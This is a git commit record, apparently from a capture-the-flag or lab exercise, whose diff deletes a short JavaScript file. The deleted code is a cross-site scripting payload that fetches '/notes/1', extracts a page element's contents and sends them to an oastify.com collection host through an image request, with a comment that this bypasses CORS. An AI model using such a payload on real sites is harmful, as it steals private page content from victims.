0f69bbccce647cfdc805c29ec663eedb75f8ec28
Lu William Hanugra <lu.hanugra@binus.ac.id>
2025-03-27 01:24:29 +0700

    Update and rename final.js to x.js

--- final.js
+++
@@ -1,5 +0,0 @@
-fetch('/notes/1').then(r=>r.text()).then(d=>{
-  let content = (new DOMParser()).parseFromString(d,'text/html').querySelector('div.mt-6').innerHTML;
-  // Use image request instead of fetch (bypasses CORS)
-  new Image().src = 'https://66an85cubmljzetr1e0ebgqzuq0hoec3.oastify.com/collect?data='+encodeURIComponent(content);
-})
